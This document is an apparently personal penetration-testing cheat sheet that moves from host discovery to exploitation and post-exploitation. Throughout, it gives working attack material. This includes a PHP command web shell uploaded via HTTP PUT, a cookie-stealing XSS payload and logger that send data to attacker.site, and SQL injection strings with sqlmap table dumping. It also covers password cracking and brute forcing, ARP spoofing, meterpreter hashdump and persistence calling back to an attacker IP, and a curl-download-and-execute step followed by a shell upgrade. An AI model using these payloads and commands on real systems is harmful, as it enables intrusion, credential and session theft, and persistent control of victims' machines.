## Finding hosts on subnet  
### Find alive hosts with fping
`fping -a -g x.x.x.x/24 2>/dev/null > hosts.txt`  
### Remove own IP (should be first line - verify before executing)
`sed -i '1d' hosts.txt`
### Run nmap scan on alive hosts | Top 1k
`nmap -AT4 -iL hosts.txt -oN namp-1k.nmap` 
### Run nmap scan on alive hosts | all ports
`nmap -AT4 -iL hosts.txt -p- -oN namp-all.nmap` 
### nmap vul scan on alive hosts
`nmap --script vuln --script-args=unsafe=1 -iL hosts.txt`

---
---

## Netcat banner grabbing
```
nc {target} 80
HEAD / HTTP/1.0
[enter twice]
```

---
---

## Get available server options
```
nc {target} 80
OPTIONS / HTTP/1.0
[enter twice]
```

---
---

## PUT abuse cmd shell
```
nc {target} 80
PUT /shell.php HTTP/1.0
Content-type: text/html
Content-length: [wc -m shell.php value]

<?php
if (isset($_GET['cmd']))
{
    $cmd = $_GET['cmd'];
    echo '<pre>';
    $result = shell_exec($cmd);
    echo $result;
    echo '</pre>';
}
?>

Usage: url/shell.php?cmd={cmd}
```

---
---

## mysql command line login and typical commands
`mysql -u {username} -p{password} -h {target}`
```
show databases;
use {database};
show tables;
select * from {table};
```

---
---

## XSS basics
`<script>alert('xss')</script>`  
`<h1>test</h1>`  
### steal cookies
```
get.php

<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$fp = fopen('jar.txt','a');

fwrite($fp, $ip.' '.$browser." \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). "\n\n");
fclose($fp);
?>
```  
### Stored XSS exploit
`<script> var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>`  

### Further Resources

[PortSwigger XSS Builder](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)  
[OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)  
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)  

---
---

## SQL Injection Basic
` ' or '1'='1'` 
` ' or '1'='1`  
` ' and 1=1; -- -`  
` ' or '1'='1'; -- -` 
` ' or 1=1; -- -`   

### SQLmap to find injection point
#### DB Banner
`sqlmap -u {url} -b`  
#### List All DBs
`sqlmap -u {url} --dbs`
#### List All Tables
`sqlmap -u {url} --current-db {db name} --tables`
#### List Table Columns
`sqlmap -u {url} --current-db {db name} -T {table} --columns`  
#### Dump Table Records
`sqlmap -u {url} --current-db {db name} -T {table} -C {column,names} --dump`

### Testing forms
`sqlmap -u {url} --forms`

### Further Resources
[PayloadAllTheThings SQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)   
[PayloadAllTheThings NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)  

---
---

## Hashcat
- --force = ignore warnings
- -m = mode
- -a = attack mode
- -o = output file 
- --remove = remove cracked hashes from source file  

`hashcat --force -m {mode} -a 0 -o results.txt --remove {hashfile.hash} /usr/share/wordlists/rockyou.txt`  
```
crack zip files


zip2john zip.zip | cut -d ':' -f 2 > hashes.txt

-- edit zip hash to match example: $zip2$*0*3*0*b5d2b7bf57ad5e86a55c400509c672bd*d218*0**ca3d736d03a34165cfa9*$/zip2$

hashcat -a 0 -m 13600 hashes.txt /usr/share/wordlists/rockyou.txt
```

[Mode Reference](https://hashcat.net/wiki/doku.php?id=example_hashes)  
[Hash-Identifier Github](https://github.com/blackploit/hash-identifier)  
[Sample Hashes](https://openwall.info/wiki/john/sample-hashes)

---
---

## Hydra Bruteforce
- -l = single user
- -L = user list
- -p = single password
- -P = password list
- -f = exit after successful login

### HTTP Form
`hydra {url} http-post-form "{url endpoint e.g. /login.php}:user=^USER^&pass=^PASS^:{rejected credentials e.g. invalid credentials" -l {username} -P {list} -f`  

---
---

## SMB NULL Session
- -n = nmblookup
- -P = enumerate password policy
- -S = enumerate shares

`enum4linux -n {target}`  
`enum4linux -P {target}`  
`enum4linux -S {target}`  

samrdump (Impacket) with no auth to dump SAM data and get usernames:  
`samrdump.py {target}`  

nmap can enum and exploit smb shares also:  
`nmap -script=smb-enum-shares {target}`  
`nmap -script=smb-enum-users {target}`  
`nmap -script-smb-brute {target}`  

## Alternatives
nbtstat:  
`nbtstat -A {target}`
- <00> signifies a workstation
- <20> signifies file sharing service is active 

smbclient:  
`smbclient -L //{target} -N`

---
---

## IP forwarding & ARP Spoofing
Enable ip_forwarding to pass packets, remain stealthy and prevent inadvertent DDoS of the network:  
`echo 1 /proc/sys/net/ipv4/ip_forward`  

Then setup arpspoof on the designated interface between a target and client machine on the network to send unsolicited arp replies (e.g. SSH server and domain workstation):  
`arpspoof -i {interface} -t {target} -r {client}`

Use wireshark on the same interface to capture traffic and then follow the TCP stream to extract details

---
---

## NMAP vulnerability scanning 
### nmap vuln 
Can return associated CVE and information about the potential exploit  
`nmap -Pn --script vuln -sV {target}`

### nmap-vulners
A CVE search nmap script  
Git clone into nmap scripts folder:
```
cd /usr/share/nmap/scripts/
git clone https://github.com/vulnersCom/nmap-vulners.git
```  
Then execute: `nmap --script nmap-vulners -sV {target}`

---
---

## meterpreter
Within a `meterpreter >` session, available commands can be found using `help` or `?`  

Important to know: 
- `sysinfo` = get victim machine info
- `ps` = get running processes on victim
- `getpid` = get attached process id
- `pwd` = print working directory
- `ls` = list current directory files
- `cat {filename}` = print contents of text file
- `run` = executes meterpreter scripts or Post modules
- `upload` = upload file to victim
- `download` = download file from victim
- `arp` = displays arp cache on victim **(useful for pivoting)**
- `ifconfig` = get victim network interfaces **(useful for pivoting)**
- `clearenv` = clear event log
- `hashdump` = dump SAM database 
- `getsystem` = SYSTEM elevation attempt ***(unlikely because of UAC)***
- `run post/windows/gather/win_privs` = see if UAC is enabled on victim, if so follow up with `bypassuac`
- `use exploit/windows/local/bypassuac` = may allow UAC bypass to session ID | if successful, then can invoke `getsystem`
- `migrate {PID}` = migrates session to new process

If a system can be fully compromise, we would want to establish persistence so that we regain a session after the workstation reboots and at user login. This can be done with the following command:  
`run persistence -U -i {interval} -p {port} -r {attacker ip}`

This command built into meterpreter will: 
- build persistent script agent
- move agent into a WINDOWS directory
- execute the agent
- install autorun into registry

---
---

## Validate RCE
Easy way of validating RCE from a cmd shell upload for example can be done with `nc`  

On attacker machine start a nc listener on any port (53 to not be blocked by WAFs is best)  
`nc -lvnp 53`  

Then on the potentially compromised machine just execute a curl command back to you with a system command as shown below:  
`curl {ip}:53/'whoami'`

- If RCE is valid, the `nc` listener will show `GET /www-data` among the header information

- If command includes spaces in the output -e.g. id, base64 encode the cmd:  
`curl {ip}:53/'id' | base64`
    - This will show `GET /{base64 string}` in the `nc` listener, which you can then run against `base64 -d` to get the original output

### Download file on victim
Also pay want to get a file onto the victim, which can be done through python's `http.server` module. 

1. Start python server on your machine:  
`python3 -m http.server {port}`
2. Use [msfvenom](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/) to create a shell if you don't already have one suitable for your target
3. Curl shell onto victim:
`curl {ip}:53/{file} -o {dir/file}`  
4. Set the file to be executable  
`chmod +x file`  
5. Run the file  
`./file` 
6. Establish full interactive shell  
`python -c 'import pty;pty.spawn("/bin/bash");'`  
`ctrl+z`  
`stty raw -echo`  
`fg`  
`export TERM=xterm`
7. Profit
